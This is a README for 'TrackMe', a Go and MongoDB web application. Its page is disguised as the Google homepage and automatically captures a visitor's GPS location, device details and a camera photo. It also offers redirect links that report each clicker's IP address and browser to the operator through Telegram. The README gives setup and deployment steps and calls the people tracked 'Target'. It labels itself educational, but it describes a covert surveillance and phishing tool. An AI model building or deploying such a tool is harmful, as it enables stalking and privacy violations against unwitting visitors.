# TrackMe

A Go-based location and photo tracking application that captures device information, geolocation, and photos from web browsers. The application stores data in MongoDB and uploads photos to AWS S3.

## Features

- **Location Tracking**: Captures GPS coordinates from browser's geolocation API
- **Device Information**: Collects detailed device and browser information
- **Photo Capture**: Takes photos using the device's camera through web interface
- **Click Tracking**: Monitor link clicks with real-time Telegram notifications
- **Data Storage**: Stores tracking data in MongoDB
- **Photo Storage**: Uploads captured photos to AWS S3
- **Web Interface**: Simple HTML interface disguised as Google homepage
- **Telegram Integration**: Real-time notifications for click tracking events

## Tech Stack

- **Backend**: Go (Golang) with Fiber v3 framework
- **Database**: MongoDB
- **Storage**: AWS S3
- **Frontend**: Vanilla HTML/JavaScript
- **Deployment**: Railway platform

## Project Structure

```
trackme/
├── cmd/trackme/          # Main application entry point
├── internal/
│   ├── config/           # Configuration (MongoDB, AWS S3)
│   ├── handlers/         # HTTP handlers and routes
│   ├── models/           # Data models
│   ├── repository/       # Database operations
│   └── services/         # External service integrations (Telegram)
├── web/                  # Static web assets
│   ├── index.html        # Main webpage
│   └── static/
│       ├── js/           # JavaScript files
│       └── images/       # Image assets
├── scripts/              # Deployment scripts
└── photos/               # Local photo storage (development)
```

## Environment Variables

Create a `.env` file for development:

```env
ENV=development
PORT=8080
MONGODB_URI=mongodb://localhost:27017/trackme
AWS_S3_REGION=your-region
AWS_ACCESS_KEY_ID=your-access-key
AWS_SECRET_ACCESS_KEY=your-secret-key
AWS_S3_BUCKET=your-bucket-name

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=your-telegram-bot-token
TELEGRAM_CHAT_ID=your-telegram-chat-id
```

## Installation & Setup

### Prerequisites
- Go 1.24.5 or higher
- MongoDB
- AWS account with S3 bucket

### Local Development

1. Clone the repository:
   ```bash
   git clone https://github.com/michaelwp/trackme.git
   cd trackme
   ```

2. Install dependencies:
   ```bash
   go mod download
   ```

3. Set up environment variables (see above)

4. Run the application:
   ```bash
   go run cmd/trackme/main.go
   ```

5. Access the application at `http://localhost:8080`

### Docker Deployment

Build and run with Docker:
```bash
docker build -t trackme .
docker run -p 8080:8080 trackme
```

### Railway Deployment

The application is configured for Railway deployment with `railway.toml`. Deploy using:
```bash
./scripts/deploy-railway.sh
```

## API Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/hello` | Health check endpoint |
| POST | `/locations` | Save location and device data |
| GET | `/locations` | Retrieve all location records |
| POST | `/locations/photos` | Upload photo files |
| GET | `/click?url=TARGET_URL` | Click tracking with Telegram notifications |

## Usage

### Web Interface
1. Access the web interface (appears as Google homepage)
2. The application automatically:
   - Requests geolocation permission
   - Captures device information
   - Takes a photo using the camera
   - Stores all data in the backend

### Click Tracking Feature
Create trackable links to monitor when someone clicks them:

1. **Setup Telegram Bot:**
   - Message @BotFather on Telegram
   - Create a new bot using `/newbot` command
   - Get your bot token and add it to `TELEGRAM_BOT_TOKEN`
   - Start a chat with your bot
   - Get your chat ID from `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
   - Add your chat ID to `TELEGRAM_CHAT_ID`

2. **Create Trackable Links:**
   ```
   https://your-domain.com/click?url=https://example.com
   ```

3. **Receive Notifications:**
   When someone clicks the link, you'll receive a Telegram notification containing:
   - Timestamp of the click
   - Visitor's IP address
   - User agent (browser/device info)
   - Referer URL
   - Target URL they were redirected to

## Data Models

### Target
- Location information (latitude, longitude)
- Device information (model, OS, browser, etc.)
- Photo information (name, path)
- Timestamps

### Photo Storage
- Local storage in `photos/` directory (development)
- AWS S3 storage (production)

## Security Considerations

- CORS enabled for all origins (configure for production)
- Environment-based configuration loading
- Graceful shutdown handling

## License

This project is for educational and demonstration purposes.